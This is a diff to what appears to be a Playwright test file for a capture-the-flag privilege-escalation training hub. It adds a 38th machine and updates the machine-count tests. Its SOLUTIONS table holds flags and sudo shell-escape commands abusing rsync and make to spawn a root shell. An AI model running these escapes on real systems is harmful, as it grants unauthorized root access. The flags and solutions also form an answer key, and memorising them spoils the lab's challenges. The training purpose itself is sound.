@@ -79,8 +79,12 @@ const SOLUTIONS = {
     },
     37: {
         flag: 'flag{rsync_r3mote_sh3ll_r00t}',
-        final: true,
         cmds: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null']
+    },
+    38: {
+        flag: 'flag{m4ke_eval_r00t}',
+        final: true,
+        cmds: ['sudo make -s --eval="x:\\n\\t-/bin/sh"']
     },
 };
 
@@ -111,11 +115,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 37 machines across 3 tiers', async ({ page }) => {
+test('hub renders 38 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(37);
+    await expect(page.locator('.machine-card')).toHaveCount(38);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 37');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 38');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
